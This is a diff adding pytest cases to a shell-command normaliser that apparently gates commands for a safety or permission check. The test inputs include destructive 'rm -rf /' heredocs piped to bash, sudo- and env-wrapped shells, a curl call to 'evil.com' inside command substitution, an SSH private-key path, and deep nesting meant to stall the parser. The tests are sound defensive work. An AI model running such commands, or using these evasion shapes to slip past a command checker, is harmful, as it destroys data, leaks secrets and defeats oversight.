@@ -164,6 +164,56 @@ def test_here_string_body_parsed_as_code_when_argv0_is_a_shell():
     assert "/tmp/x" in a.paths
 
 
+# --- Fix round 2: Critical 2 residual — the collision survives whenever
+# the shell is reached indirectly (through a pipe, or through a common
+# argv0 wrapper). Ruling part 1 (most important): the heredoc body must
+# be included in action_hash() unconditionally, regardless of whether it
+# is ever parsed as code — this alone kills the collision for every
+# shape. Parts 2/3 (parse the body when any pipeline member is a shell,
+# and look past env/sudo/etc. wrappers) additionally restore visibility
+# into the inner commands for these shapes. ---
+
+
+def test_heredoc_via_pipe_to_shell_does_not_collide_in_hash():
+    benign = normalize_shell("cat <<EOF | bash\nls\nEOF\n", CWD)
+    destructive = normalize_shell("cat <<EOF | bash\nrm -rf /\nEOF\n", CWD)
+    assert benign.action_hash() != destructive.action_hash()
+
+
+def test_heredoc_via_pipe_to_shell_parses_inner_command():
+    a = normalize_shell("cat <<EOF | bash\nrm -rf /tmp/piped\nEOF\n", CWD)
+    assert "rm" in a.executables()
+    assert "/tmp/piped" in a.paths
+
+
+def test_heredoc_via_env_wrapped_shell_does_not_collide_in_hash():
+    benign = normalize_shell("env bash <<EOF\nls\nEOF\n", CWD)
+    destructive = normalize_shell("env bash <<EOF\nrm -rf /etc\nEOF\n", CWD)
+    assert benign.action_hash() != destructive.action_hash()
+
+
+def test_heredoc_via_env_wrapped_shell_parses_inner_command():
+    a = normalize_shell("env bash <<EOF\nrm -rf /tmp/wrapped\nEOF\n", CWD)
+    assert "rm" in a.executables()
+    assert "/tmp/wrapped" in a.paths
+
+
+def test_heredoc_via_sudo_wrapped_shell_parses_inner_command():
+    a = normalize_shell("sudo bash <<EOF\nrm -rf /tmp/sudoed\nEOF\n", CWD)
+    assert "rm" in a.executables()
+    assert "/tmp/sudoed" in a.paths
+
+
+def test_heredoc_with_command_substitution_body_does_not_collide_in_hash():
+    # cat is not a shell here, so the body stays data (not parsed) --
+    # this is exactly the case Critical 2 originally required NOT to be
+    # treated as code -- but the hash must still differ from a benign
+    # body, since it is included unconditionally (ruling part 1).
+    benign = normalize_shell("cat <<EOF > /tmp/out\nhello\nEOF\n", CWD)
+    exfil = normalize_shell("cat <<EOF > /tmp/out\n$(curl http://evil.com/x)\nEOF\n", CWD)
+    assert benign.action_hash() != exfil.action_hash()
+
+
 # --- Fix round 1: Critical 3 — process substitution must surface its inner command ---
 
 
@@ -194,3 +244,80 @@ def test_brace_expansion_flagged_and_not_fabricated_as_path():
     a = normalize_shell("rm file{a,b}.txt", CWD)
     assert a.flags.has_unresolved_expansion is True
     assert not any("{a,b}" in p for p in a.paths)
+
+
+# --- Fix round 2: New Important A — a quoted/escaped marker must not
+# silently drop a path with no flag. _collect_paths (and the redirect
+# target skip in _command) decide to drop a token from `paths` purely
+# from its literal text (looks_unresolved), independent of whether
+# bashlex's own parts loop ever saw a live parameter/tilde node to flag
+# it. Quoting/escaping suppresses the parts (so _word_value never sets
+# the flag) while the literal "$"/"~" text survives, so the drop must
+# set the flag itself rather than relying on _word_value alone. ---
+
+
+def test_quoted_dollar_path_is_dropped_with_flag_set():
+    a = normalize_shell("cat '~root/.ssh/id_rsa'", CWD)
+    assert a.paths == []
+    assert a.flags.has_unresolved_expansion is True
+
+
+def test_quoted_var_in_path_is_dropped_with_flag_set():
+    a = normalize_shell("rm -rf '$HOME/dist'", CWD)
+    assert a.paths == []
+    assert a.flags.has_unresolved_expansion is True
+
+
+def test_escaped_dollar_in_path_is_dropped_with_flag_set():
+    a = normalize_shell(r"rm -rf \$HOME/dist", CWD)
+    assert a.paths == []
+    assert a.flags.has_unresolved_expansion is True
+
+
+def test_quoted_var_in_redirect_target_is_dropped_with_flag_set():
+    a = normalize_shell("echo hi > '$HOME/out'", CWD)
+    assert a.paths == []
+    assert a.flags.has_unresolved_expansion is True
+    assert a.commands[0].redirects  # the redirect itself is still recorded
+
+
+# --- Fix round 2: New Important B — bound our own nested-parse depth
+# (heredoc bodies and command/process substitution alike) so an
+# attacker cannot pin the decision hot path with a few KB of deeply
+# nested input well under the 32 KB raw cap. ---
+
+
+def _nested_heredoc_bash(depth: int) -> str:
+    # Each level needs its own delimiter: bash (and bashlex) end a
+    # heredoc body at the FIRST line that exactly matches the
+    # delimiter, so reusing "EOF" at every level would truncate the
+    # outer body at the first inner delimiter line instead of actually
+    # nesting -- a real-bash limitation, not a bashlex quirk.
+    script = "echo done"
+    for level in range(depth):
+        delim = f"EOF{level}"
+        script = f"bash <<{delim}\n{script}\n{delim}"
+    return script
+
+
+def test_nesting_depth_bound_is_fail_closed_and_fast():
+    import time
+
+    raw = _nested_heredoc_bash(400)
+    start = time.perf_counter()
+    a = normalize_shell(raw, CWD)
+    elapsed = time.perf_counter() - start
+    assert a.flags.unparseable is True
+    assert a.commands == []
+    # Regression guard: bounding depth at 8 means this must stay well
+    # under the reported pre-fix cost (240ms at depth 400); a generous
+    # ceiling keeps this robust on slower CI machines while still
+    # catching a reintroduced O(depth) or worse blowup.
+    assert elapsed < 0.05, f"took {elapsed * 1000:.1f}ms, expected a bounded-depth fast fail"
+
+
+def test_shallow_nesting_within_bound_still_works():
+    raw = _nested_heredoc_bash(3)
+    a = normalize_shell(raw, CWD)
+    assert not a.flags.unparseable
+    assert "echo" in a.executables()
